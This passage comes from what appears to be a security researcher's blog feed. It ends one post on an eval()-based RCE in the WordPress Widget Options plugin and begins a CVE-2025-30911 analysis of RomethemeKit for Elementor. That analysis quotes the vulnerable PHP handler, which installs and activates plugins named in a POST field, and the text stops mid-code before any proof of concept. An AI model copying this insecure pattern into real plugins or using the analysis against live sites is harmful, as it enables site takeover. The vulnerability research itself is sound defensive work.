server.&lt;/p&gt;&#xA;&lt;p&gt;Although later versions introduced expression validation, the root cause still lies in &lt;strong&gt;trusting unfiltered logic input&lt;/strong&gt; and allowing dynamic execution through &lt;code&gt;eval()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Never pass user-controlled data into &lt;code&gt;eval()&lt;/code&gt;&lt;/strong&gt;, even in “logic” or conditional features.&lt;/li&gt;&#xA;&lt;li&gt;All block / widget attributes must be &lt;strong&gt;strictly validated and sanitized&lt;/strong&gt; before use.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Contributor-level privileges can still be extremely dangerous&lt;/strong&gt; when combined with unsafe server-side code execution mechanisms.&lt;/li&gt;&#xA;&lt;li&gt;Avoid dynamic code execution; instead, use a &lt;strong&gt;safe parser&lt;/strong&gt; or a &lt;strong&gt;whitelist of valid expressions&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/widget-options/vulnerability/wordpress-widget-options-plugin-4-0-7-authenticated-contributor-remote-code-execution-vulnerability&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Widget Options Plugin &amp;lt;= 4.0.7 is vulnerable to PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-30911 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-03-cve-2025-30911/</link>
      <pubDate>Wed, 03 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-03-cve-2025-30911/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-03-cve-2025-30911/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Improper Control of Generation of Code (&amp;lsquo;Code Injection&amp;rsquo;)&lt;/strong&gt; vulnerability in &lt;strong&gt;Rometheme RomethemeKit For Elementor&lt;/strong&gt; allows &lt;strong&gt;Command Injection&lt;/strong&gt; to occur. This issue affects &lt;strong&gt;RomethemeKit For Elementor&lt;/strong&gt; from n/a up to version &lt;strong&gt;1.5.4&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-30911&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-30911&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.5.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.5.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Subscriber&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/rometheme-for-elementor/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress RTMKit Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;RTMKit&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.5.3&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.5.5&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Note&lt;/p&gt;&lt;p&gt;Although the vulnerability was reported as affecting up to version &lt;strong&gt;1.5.4&lt;/strong&gt;, it was actually partially patched in that version, so I chose version &lt;strong&gt;1.5.3&lt;/strong&gt; for the analysis.&lt;/p&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;In the vulnerable version (v1.5.3):&lt;/strong&gt;&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;install_requirements&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;include_once&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;ABSPATH&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wp-admin/includes/plugin.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;include_once&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;ABSPATH&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wp-admin/includes/file.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;include_once&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;ABSPATH&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wp-admin/includes/misc.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;include_once&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;ABSPATH&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wp-admin/includes/class-wp-upgrader.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$plugin&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;plugin&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$plugin_file&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;WP_PLUGIN_DIR&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$plugin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$plugin_slug&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;dirname&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$plugin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;file_exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$plugin_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Activate&amp;ensp;the&amp;ensp;plugin&amp;ensp;if&amp;ensp;already&amp;ensp;installed&amp;ensp;but&amp;ensp;inactive&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;ob_start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;activate_plugin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$plugin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;ob_clean&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;ob_end_clean&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_send_json_success&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Install&amp;ensp;and&amp;ensp;Activate&amp;ensp;Successfully&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;ob_start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$plugin_download_url&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;https://downloads.wordpress.org/plugin/&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$plugin_slug&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;.latest-stable.zip&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Adjust&amp;ensp;URL&amp;ensp;structure&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$upgrader&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;\Plugin_Upgrader&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$upgrader&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;install&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$plugin_download_url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;is_wp_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_send_json_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$activate_result&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;activate_plugin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$plugin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;is_wp_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$activate_result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span 